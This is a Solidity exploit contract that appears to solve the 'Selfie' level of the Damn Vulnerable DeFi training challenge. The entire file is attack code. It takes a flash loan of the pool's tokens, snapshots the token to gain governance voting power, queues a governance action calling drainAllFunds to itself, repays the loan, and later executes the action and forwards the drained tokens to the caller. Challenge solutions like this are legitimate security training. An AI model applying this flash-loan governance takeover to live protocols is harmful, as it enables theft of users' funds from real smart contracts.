// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttacker {
    SimpleGovernance public governanceContract;
    SelfiePool public pool;
    DamnValuableTokenSnapshot public token;
    uint256 public actionId;

    constructor(
        address _governanceContract,
        address _flashLoanPool,
        address _token
    ) {
        governanceContract = SimpleGovernance(_governanceContract);
        pool = SelfiePool(_flashLoanPool);
        token = DamnValuableTokenSnapshot(_token);
    }

    function attack(uint256 tokensInPool) public {
        pool.flashLoan(tokensInPool);
    }

    fallback() external {
        uint256 contractBalance = token.balanceOf(address(this));
        require(contractBalance > 0, "contract balnce = 0");
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );
        token.snapshot();
        actionId = governanceContract.queueAction(address(pool), data, 0);
        token.transfer(address(pool), contractBalance);
    }

    function executeAction() public {
        governanceContract.executeAction(actionId);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}
